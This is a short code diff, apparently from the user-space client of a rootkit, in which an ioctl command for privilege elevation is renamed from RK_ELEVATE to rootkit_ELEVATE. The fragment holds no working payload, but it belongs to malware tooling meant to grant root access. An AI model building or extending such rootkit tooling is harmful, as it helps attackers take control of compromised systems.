@@ -15,7 +15,7 @@ int main(void) {
         return -1;
     }
 
-    if (ioctl(fd, RK_ELEVATE) == -1) {
+    if (ioctl(fd, rootkit_ELEVATE) == -1) {
         perror("ioctl");
         close(fd);
         return -1;
